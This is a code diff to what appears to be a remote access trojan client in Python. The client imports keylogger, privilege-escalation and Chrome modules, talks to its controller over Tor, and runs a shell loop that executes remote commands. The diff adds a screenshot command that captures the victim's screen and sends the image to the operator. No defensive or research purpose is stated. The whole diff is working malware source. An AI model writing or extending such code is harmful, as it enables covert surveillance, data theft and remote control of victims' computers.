@@ -8,11 +8,10 @@ import threading
 from sys import platform
 from shutil import copyfile
 import requests
-from mss import mss
 import time
 
 # Local tools to the application
-from tools import keylogger, privilege, chrome, peripherals
+from tools import keylogger, privilege, chrome, peripherals, screenshot
 
 #importing tor network
 from tor_network import ClientSocket, Tor
@@ -164,6 +163,42 @@ def handle_file_transfer(command_data):
         except:
             pass
 
+def handle_screenshot():
+    """Handle screenshot command
+    Returns:
+        dict: Response with success/error message
+    """
+    try:
+        # Initialize screenshot module
+        screen = screenshot.Screenshot()
+        
+        try:
+            # Take screenshot
+            success, message, image_data = screen.capture()
+            
+            if not success or not image_data:
+                return {'error': message}
+            
+            # Send success response with file size
+            reliable_send({
+                'success': True,
+                'message': message,
+                'size': len(image_data)
+            })
+            
+            # Send image data
+            s.sendall(image_data)
+            
+            return {'success': True, 'message': message}
+            
+        finally:
+            screen.cleanup()
+            
+    except Exception as e:
+        error_msg = f"Screenshot error: {str(e)}"
+        print(error_msg)
+        return {'error': error_msg}
+
 def shell():
     while True:
         try:
@@ -208,6 +243,10 @@ def shell():
                     })
                 except Exception as e:
                     reliable_send({'error': str(e)})
+            elif command == 'screenshot':
+                print("[*] Taking screenshot...")
+                response = handle_screenshot()
+                reliable_send(response)
             else:
                 print(f"[*] Executing: {command}")
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
